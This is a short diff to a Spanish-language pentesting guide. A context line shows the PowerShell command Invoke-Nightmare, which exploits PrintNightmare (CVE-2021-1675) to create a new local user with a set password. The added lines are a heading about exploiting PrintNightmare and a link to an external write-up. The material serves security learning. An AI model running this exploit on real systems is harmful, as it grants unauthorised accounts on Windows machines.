@@ -152,3 +152,7 @@ ahora ya podriamos crear al usuario:
 ```bash
 Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
 ```
+
+**AQUI MAS INFORMACION DE COMO EXPLOTAR PRINTNIGHTMARE**
+
+[https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/](https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/)
